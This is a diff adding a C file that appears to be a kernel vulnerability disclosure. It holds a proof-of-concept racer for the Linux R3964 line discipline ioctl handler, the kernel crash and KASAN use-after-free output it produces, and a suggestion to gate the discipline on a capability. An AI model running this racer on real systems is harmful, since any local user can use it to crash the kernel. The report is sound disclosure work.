@@ -1,0 +1,192 @@
+/*
+The Siemens R3964 line discipline code in drivers/tty/n_r3964.c has a few races
+around its ioctl handler; for example, the handler for R3964_ENABLE_SIGNALS
+just allocates and deletes elements in a linked list with zero locking.
+This code is reachable by an unprivileged user if the line discipline is enabled
+in the kernel config; Ubuntu 18.04, for example, ships this line discipline as a
+module.
+
+Proof of concept:
+
+==================================
+user@ubuntu-18-04-vm:~/r3964$ cat r3964_racer.c
+*/
+
+#define _GNU_SOURCE
+#include <pthread.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdio.h>
+#include <err.h>
+#include <stdlib.h>
+#include <linux/n_r3964.h>
+
+static int ptm_fd, slave_fd;
+
+static void *thread_fn(void *dummy) {
+  int res;
+  while (1) {
+    res = ioctl(slave_fd, R3964_ENABLE_SIGNALS, R3964_SIG_ALL);
+    printf("R3964_ENABLE_SIGNALS: %d\n", res);
+    res = ioctl(slave_fd, R3964_ENABLE_SIGNALS, 0);
+    printf("R3964_ENABLE_SIGNALS: %d\n", res);
+  }
+}
+
+int main(void) {
+  ptm_fd = getpt();
+  if (ptm_fd == -1) err(1, "getpt");
+  if (unlockpt(ptm_fd)) err(1, "unlockpt");
+  slave_fd = ioctl(ptm_fd, TIOCGPTPEER, O_RDWR);
+  if (slave_fd == -1) err(1, "TIOCGPTPEER");
+
+  printf("-----------------------------------------\n");
+  system("ls -l /proc/$PPID/fd");
+  printf("-----------------------------------------\n");
+
+  const int disc_r3964 = N_R3964;
+  if (ioctl(slave_fd, TIOCSETD, &disc_r3964)) err(1, "TIOCSETD");
+
+  pthread_t thread;
+  if (pthread_create(&thread, NULL, thread_fn, NULL)) errx(1, "pthread_create");
+
+  thread_fn(NULL);
+
+  return 0;
+}
+
+/*
+user@ubuntu-18-04-vm:~/r3964$ gcc -o r3964_racer r3964_racer.c -pthread && ./r3964_racer
+[...]
+==================================
+
+dmesg splat:
+
+==================================
+[   82.646953] r3964: Philips r3964 Driver $Revision: 1.10 $
+[   82.656459] ------------[ cut here ]------------
+[   82.656461] kernel BUG at /build/linux-Y38gIP/linux-4.15.0/mm/slub.c:296!
+[   82.658396] invalid opcode: 0000 [#1] SMP PTI
+[   82.659515] Modules linked in: n_r3964 joydev ipt_MASQUERADE nf_nat_masquerade_ipv4 nf_conntrack_netlink nfnetlink xfrm_user xfrm_algo iptable_nat nf_conntrack_ipv4 nf_defrag_ipv4 nf_nat_ipv4 xt_addrtype iptable_filter xt_conntrack nf_nat nf_conntrack libcrc32c br_netfilter bridge stp llc aufs overlay snd_hda_codec_generic crct10dif_pclmul crc32_pclmul snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep ghash_clmulni_intel snd_pcm snd_seq_midi snd_seq_midi_event pcbc aesni_intel aes_x86_64 snd_rawmidi snd_seq snd_seq_device snd_timer snd crypto_simd glue_helper cryptd input_leds soundcore mac_hid 9pnet_virtio 9pnet serio_raw qemu_fw_cfg sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 virtio_gpu ttm floppy drm_kms_helper psmouse syscopyarea sysfillrect sysimgblt fb_sys_fops drm
+[   82.677770]  virtio_net i2c_piix4 pata_acpi
+[   82.678849] CPU: 1 PID: 2209 Comm: r3964_racer Not tainted 4.15.0-42-generic #45-Ubuntu
+[   82.680897] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[   82.683098] RIP: 0010:kfree+0x16a/0x180
+[   82.684116] RSP: 0018:ffffb6b381d7fd50 EFLAGS: 00010246
+[   82.685454] RAX: ffff9bb0b4770000 RBX: ffff9bb0b4770000 RCX: ffff9bb0b4770000
+[   82.687285] RDX: 0000000000006e86 RSI: ffff9bb1bfca70a0 RDI: ffff9bb1bb003800
+[   82.689247] RBP: ffffb6b381d7fd68 R08: ffffffffc0511db0 R09: ffffffffc051202c
+[   82.691077] R10: ffffeb8c80d1dc00 R11: 0000000000000000 R12: ffff9bb1b3430e40
+[   82.692906] R13: ffffffffc051202c R14: ffff9bb13b56e800 R15: ffff9bb12d1addd0
+[   82.694726] FS:  00007ff9b92da740(0000) GS:ffff9bb1bfc80000(0000) knlGS:0000000000000000
+[   82.696801] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   82.698421] CR2: 0000558cf9e32ec8 CR3: 00000000a513a005 CR4: 00000000003606e0
+[   82.700259] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[   82.702113] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[   82.703946] Call Trace:
+[   82.704602]  r3964_ioctl+0x27c/0x2b0 [n_r3964]
+[   82.705746]  tty_ioctl+0x138/0x8c0
+[   82.706631]  ? __wake_up+0x13/0x20
+[   82.707516]  do_vfs_ioctl+0xa8/0x630
+[   82.708610]  ? vfs_write+0x166/0x1a0
+[   82.709543]  SyS_ioctl+0x79/0x90
+[   82.710405]  do_syscall_64+0x73/0x130
+[   82.711357]  entry_SYSCALL_64_after_hwframe+0x3d/0xa2
+[   82.712659] RIP: 0033:0x7ff9b8bd45d7
+[   82.713680] RSP: 002b:00007fffcd85bcf8 EFLAGS: 00000202 ORIG_RAX: 0000000000000010
+[   82.715617] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ff9b8bd45d7
+[   82.717463] RDX: 0000000000000000 RSI: 0000000000005301 RDI: 0000000000000004
+[   82.719411] RBP: 00007fffcd85bd20 R08: 0000000000000000 R09: 0000000000000000
+[   82.721248] R10: 0000000000000000 R11: 0000000000000202 R12: 0000556df58ed820
+[   82.723093] R13: 00007fffcd85be30 R14: 0000000000000000 R15: 0000000000000000
+[   82.724930] Code: c4 80 74 04 41 8b 72 6c 4c 89 d7 e8 61 1c f9 ff eb 86 41 b8 01 00 00 00 48 89 d9 48 89 da 4c 89 d6 e8 8b f6 ff ff e9 6d ff ff ff <0f> 0b 48 8b 3d 6d c5 1c 01 e9 c9 fe ff ff 0f 1f 84 00 00 00 00 
+[   82.729909] RIP: kfree+0x16a/0x180 RSP: ffffb6b381d7fd50
+[   82.731310] ---[ end trace c1cd537c5d2e0b84 ]---
+==================================
+
+
+I've also tried this on 5.0-rc2 with KASAN on, which resulted in this splat:
+
+==================================
+[   69.883056] ==================================================================
+[   69.885163] BUG: KASAN: use-after-free in r3964_ioctl+0x288/0x3c0
+[   69.886855] Read of size 8 at addr ffff8881e0474020 by task r3964_racer/1134
+[   69.888820] 
+[   69.889251] CPU: 3 PID: 1134 Comm: r3964_racer Not tainted 5.0.0-rc2 #238
+[   69.891729] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[   69.894535] Call Trace:
+[   69.895223]  dump_stack+0x71/0xab
+[   69.896134]  ? r3964_ioctl+0x288/0x3c0
+[   69.897181]  print_address_description+0x6a/0x270
+[   69.898473]  ? r3964_ioctl+0x288/0x3c0
+[   69.899499]  ? r3964_ioctl+0x288/0x3c0
+[   69.900534]  kasan_report+0x14e/0x192
+[   69.901562]  ? r3964_ioctl+0x288/0x3c0
+[   69.902606]  r3964_ioctl+0x288/0x3c0
+[   69.903586]  tty_ioctl+0x227/0xbd0
+[...]
+[   69.917312]  do_vfs_ioctl+0x134/0x8f0
+[...]
+[   69.926807]  ksys_ioctl+0x70/0x80
+[   69.927709]  __x64_sys_ioctl+0x3d/0x50
+[   69.928734]  do_syscall_64+0x73/0x160
+[   69.929741]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[   69.931099] RIP: 0033:0x7f6491542dd7
+[   69.932068] Code: 00 00 00 48 8b 05 c1 80 2b 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 80 2b 00 f7 d8 64 89 01 48
+[   69.937051] RSP: 002b:00007f6491460f28 EFLAGS: 00000206 ORIG_RAX: 0000000000000010
+[   69.939067] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f6491542dd7
+[   69.940977] RDX: 000000000000000f RSI: 0000000000005301 RDI: 0000000000000004
+[   69.942905] RBP: 00007f6491460f50 R08: 0000000000000000 R09: 0000000000000018
+[   69.944800] R10: 0000000000000064 R11: 0000000000000206 R12: 0000000000000000
+[   69.947600] R13: 00007ffeb17a9b4f R14: 0000000000000000 R15: 00007f6491c42040
+[   69.949491] 
+[   69.949923] Allocated by task 1131:
+[   69.950866]  __kasan_kmalloc.constprop.8+0xa5/0xd0
+[   69.952147]  kmem_cache_alloc_trace+0xfa/0x200
+[   69.953352]  r3964_ioctl+0x2e6/0x3c0
+[   69.954333]  tty_ioctl+0x227/0xbd0
+[   69.955267]  do_vfs_ioctl+0x134/0x8f0
+[   69.956248]  ksys_ioctl+0x70/0x80
+[   69.957150]  __x64_sys_ioctl+0x3d/0x50
+[   69.958169]  do_syscall_64+0x73/0x160
+[   69.959148]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[   69.960485] 
+[   69.960910] Freed by task 1131:
+[   69.961764]  __kasan_slab_free+0x135/0x180
+[   69.962851]  kfree+0x90/0x1d0
+[   69.963660]  r3964_ioctl+0x208/0x3c0
+[   69.964631]  tty_ioctl+0x227/0xbd0
+[   69.965564]  do_vfs_ioctl+0x134/0x8f0
+[   69.966540]  ksys_ioctl+0x70/0x80
+[   69.967424]  __x64_sys_ioctl+0x3d/0x50
+[   69.968424]  do_syscall_64+0x73/0x160
+[   69.969414]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[   69.970768] 
+[   69.971182] The buggy address belongs to the object at ffff8881e0474008
+[   69.971182]  which belongs to the cache kmalloc-64 of size 64
+[   69.974429] The buggy address is located 24 bytes inside of
+[   69.974429]  64-byte region [ffff8881e0474008, ffff8881e0474048)
+[   69.977470] The buggy address belongs to the page:
+[   69.978744] page:ffffea0007811d00 count:1 mapcount:0 mapping:ffff8881e600f740 index:0x0 compound_mapcount: 0
+[   69.981316] flags: 0x17fffc000010200(slab|head)
+[   69.982528] raw: 017fffc000010200 ffffea0007554508 ffffea0007811e08 ffff8881e600f740
+[   69.984722] raw: 0000000000000000 0000000000270027 00000001ffffffff 0000000000000000
+[   69.984723] page dumped because: kasan: bad access detected
+[   69.984724] 
+[   69.984725] Memory state around the buggy address:
+[   69.984727]  ffff8881e0473f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   69.984729]  ffff8881e0473f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   69.984731] >ffff8881e0474000: fc fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc
+[   69.984732]                                ^
+[   69.984734]  ffff8881e0474080: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   69.984736]  ffff8881e0474100: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   69.984737] ==================================================================
+[   69.984739] Disabling lock debugging due to kernel taint
+[   69.996233] ==================================================================
+==================================
+
+
+I wonder whether it would, in addition to fixing the locking, also make sense to
+gate the line discipline on some sort of capability - it seems wrong to me that
+this kind of code is exposed to every user on the system.
+*/
